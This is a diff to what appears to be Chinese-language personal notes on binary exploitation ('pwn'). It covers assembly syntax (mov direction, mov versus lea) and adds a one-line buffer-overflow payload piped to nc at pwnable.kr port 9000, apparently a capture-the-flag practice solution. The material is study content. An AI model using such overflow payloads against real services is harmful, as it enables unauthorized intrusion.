@@ -1,4 +1,16 @@
 * pwn
+** 汇编相关
+*** mov 的方向
+    INTEL 汇编语法第一个操作数表示目的操作数,第二个表示源操作数,赋值方向从右向左
+    mov eax , ebx  // eax = ebx
+    AT&T 反过来
+    movl %ebx , %eax // eax = ebx
+    记忆 : linux 字母高度越来越低,所以往右边移 
+*** mov 和 lea 的区别
+    mov ecx , [ eax + 0x30 ] 表示把 eax + 0x30 这个值所表示的地址中的数据赋值给 ecx
+    lea ecx , [ eax + 0x30 ] 表示把 eax + 0x30 这个值赋给 ecx , 即 ecx = eax + 0x30
+** (python -c "print 'a'*52 + '\xbe\xba\xfe\xca'" ; cat ) | nc pwnable.kr 9000
+   注意管道前边还有个 cat 
 ** http request
 *** basic
 >>> r = remote( 'my.csdn.net' , 80 )
